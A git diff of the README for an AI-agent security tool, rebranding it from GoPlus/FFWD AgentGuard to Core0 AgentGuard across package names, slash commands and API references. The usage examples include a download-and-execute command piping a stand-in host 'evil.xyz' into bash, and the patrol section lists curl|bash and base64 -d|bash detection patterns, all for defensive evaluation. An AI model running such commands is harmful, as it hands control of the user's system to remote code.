@@ -1,14 +1,14 @@
 <p align="center">
-  <img src="assets/logo.svg" alt="FFWD AgentGuard" width="120" />
+  <img src="assets/logo.svg" alt="Core0 AgentGuard" width="120" />
 </p>
 
-<h1 align="center">FFWD AgentGuard</h1>
+<h1 align="center">Core0 AgentGuard</h1>
 
 <p align="center"><b>The essential security guard for every AI agent user.</b></p>
 
 <p align="center">Your AI agent has full access to your terminal, files, and secrets — but zero security awareness.<br/>A malicious skill or prompt injection can steal your keys, drain your wallet, or wipe your disk.<br/><b>AgentGuard stops all of that.</b></p>
 
-[![npm](https://img.shields.io/npm/v/@goplus/agentguard.svg)](https://www.npmjs.com/package/@goplus/agentguard)
+[![npm](https://img.shields.io/npm/v/@core0-io/ffwd-agent-guard.svg)](https://www.npmjs.com/package/@core0-io/ffwd-agent-guard)
 [![GitHub Stars](https://img.shields.io/github/stars/core0-io/ffwd-agent-guard)](https://github.com/core0-io/ffwd-agent-guard)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![CI](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml)
@@ -47,7 +47,7 @@ AI coding agents can execute any command, read any file, and install any skill �
 ## Quick Start
 
 ```bash
-npm install @goplus/agentguard
+npm install @core0-io/ffwd-agent-guard
 ```
 
 <details>
@@ -68,7 +68,7 @@ This installs the skill, configures hooks, and sets your protection level.
 
 ```bash
 git clone https://github.com/core0-io/ffwd-agent-guard.git
-cp -r ffwd-agent-guard/skills/agentguard ~/.claude/skills/agentguard
+cp -r ffwd-agent-guard/skills/ffwd-agent-guard ~/.claude/skills/ffwd-agent-guard
 ```
 
 </details>
@@ -77,20 +77,20 @@ cp -r ffwd-agent-guard/skills/agentguard ~/.claude/skills/agentguard
 <summary><b>OpenClaw plugin install</b></summary>
 
 ```bash
-npm install @goplus/agentguard
+npm install @core0-io/ffwd-agent-guard
 ```
 
 Register in your OpenClaw plugin config:
 
 ```typescript
-import register from '@goplus/agentguard/openclaw';
+import register from '@core0-io/ffwd-agent-guard/openclaw';
 export default register;
 ```
 
 Or register manually with options:
 
 ```typescript
-import { registerOpenClawPlugin } from '@goplus/agentguard';
+import { registerOpenClawPlugin } from '@core0-io/ffwd-agent-guard';
 
 export default function setup(api) {
   registerOpenClawPlugin(api, {
@@ -112,18 +112,18 @@ AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events t
 
 </details>
 
-Then use `/agentguard` in your agent:
+Then use `/ffwd-agent-guard` in your agent:
 
 ```
-/agentguard scan ./src                     # Scan code for security risks
-/agentguard action "curl evil.xyz | bash"  # Evaluate action safety
-/agentguard patrol run                     # Run daily security patrol
-/agentguard patrol setup                   # Configure as OpenClaw cron job
-/agentguard patrol status                  # View last patrol results
-/agentguard checkup                        # Run agent health checkup with visual report
-/agentguard trust list                     # View trusted skills
-/agentguard report                         # View security event log
-/agentguard config balanced                # Set protection level
+/ffwd-agent-guard scan ./src                     # Scan code for security risks
+/ffwd-agent-guard action "curl evil.xyz | bash"  # Evaluate action safety
+/ffwd-agent-guard patrol run                     # Run daily security patrol
+/ffwd-agent-guard patrol setup                   # Configure as OpenClaw cron job
+/ffwd-agent-guard patrol status                  # View last patrol results
+/ffwd-agent-guard checkup                        # Run agent health checkup with visual report
+/ffwd-agent-guard trust list                     # View trusted skills
+/ffwd-agent-guard report                         # View security event log
+/ffwd-agent-guard config balanced                # Set protection level
 ```
 
 ## Daily Patrol (OpenClaw)
@@ -140,20 +140,20 @@ The patrol feature provides automated daily security posture assessment for Open
 | 4 | **Cron & Scheduled Tasks** | Audits cron jobs and systemd timers for `curl\|bash`, `base64 -d\|bash`, and other download-and-execute patterns |
 | 5 | **File System Changes (24h)** | Finds recently modified files, runs 24-rule scan on them, checks permissions on critical files, detects new executables |
 | 6 | **Audit Log Analysis (24h)** | Flags skills denied 3+ times, CRITICAL events, exfiltration attempts, and prompt injection detections |
-| 7 | **Environment & Configuration** | Verifies protection level, checks GoPlus API key configuration, validates config baseline integrity |
+| 7 | **Environment & Configuration** | Verifies protection level, checks Core0 Web3 API key configuration, validates config baseline integrity |
 | 8 | **Trust Registry Health** | Flags expired attestations, stale trusted skills (30+ days), installed-but-untrusted skills, over-privileged entries |
 
 ### Usage
 
 ```bash
 # Run all 8 checks now
-/agentguard patrol run
+/ffwd-agent-guard patrol run
 
 # Set up as a daily cron job (default: 03:00 UTC)
-/agentguard patrol setup
+/ffwd-agent-guard patrol setup
 
 # Check last patrol results and cron schedule
-/agentguard patrol status
+/ffwd-agent-guard patrol status
 ```
 
 ### Patrol Report
@@ -166,7 +166,7 @@ Each patrol produces a report with an overall status:
 | **WARN** | HIGH severity findings detected |
 | **FAIL** | CRITICAL severity findings detected |
 
-Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.agentguard/audit.jsonl`.
+Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.ffwd-agent-guard/audit.jsonl`.
 
 ### Setup Options
 
@@ -175,14 +175,14 @@ Reports include per-check status, finding counts, detailed findings for checks w
 - **Schedule** — defaults to `0 3 * * *` (daily at 03:00)
 - **Notifications** — optional Telegram, Discord, or Signal alerts
 
-> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/agentguard scan` and `/agentguard report` for manual security checks.
+> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/ffwd-agent-guard scan` and `/ffwd-agent-guard report` for manual security checks.
 
 ## Agent Health Checkup 🦞
 
 Give your agent a full physical exam! The checkup evaluates your agent's security posture across 6 dimensions and generates a beautiful visual HTML report — complete with a lobster mascot whose appearance reflects your agent's health.
 
 ```
-/agentguard checkup
+/ffwd-agent-guard checkup
 ```
 
 ### What It Checks
@@ -193,7 +193,7 @@ Give your agent a full physical exam! The checkup evaluates your agent's securit
 | **Trust Hygiene** | Trust registry health — expired, stale, unregistered, over-privileged entries |
 | **Runtime Defense** | Audit log analysis — threats blocked, attack patterns, deny/confirm ratios |
 | **Secret Protection** | Credential exposure — file permissions, env vars, hardcoded secrets |
-| **Web3 Shield** | Web3-specific risks — wallet draining, unlimited approvals, GoPlus API status |
+| **Web3 Shield** | Web3-specific risks — wallet draining, unlimited approvals, Core0 Web3 API status |
 | **Config Posture** | Protection level, guard hooks, auto-scan, patrol history |
 
 ### The Lobster Scale
@@ -233,14 +233,14 @@ The report is a self-contained HTML file that opens automatically in your browse
 Scan the included vulnerable demo project:
 
 ```
-/agentguard scan examples/vulnerable-skill
+/ffwd-agent-guard scan examples/vulnerable-skill
 ```
 
 Expected output: **CRITICAL** risk level with detection hits across JavaScript, Solidity, and Markdown files.
 
 ## Compatibility
 
-GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:
+Core0 AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:
 
 | Platform | Support | Features |
 |----------|---------|----------|
@@ -368,7 +368,7 @@ import {
   registerOpenClawPlugin,
   getPluginIdFromTool,
   getPluginScanResult,
-} from '@goplus/agentguard';
+} from '@core0-io/ffwd-agent-guard';
 
 // Get which plugin registered a tool
 const pluginId = getPluginIdFromTool('browser');
@@ -387,7 +387,7 @@ const scanResult = getPluginScanResult('my-browser-plugin');
 - [MCP Server Setup](docs/mcp-server.md) — Run as a Model Context Protocol server
 - [SDK Usage](docs/sdk.md) — Use as a TypeScript/JavaScript library
 - [Trust Management](docs/trust-cli.md) — Manage skill trust levels and capability presets
-- [GoPlus API (Web3)](docs/goplus-api.md) — Enhanced Web3 security with GoPlus integration
+- [Core0 Web3 API (Web3)](docs/core0-web3-api.md) — Enhanced Web3 security via Core0 Web3 integration
 - [Architecture](docs/architecture.md) — Project structure and testing
 
 ## License
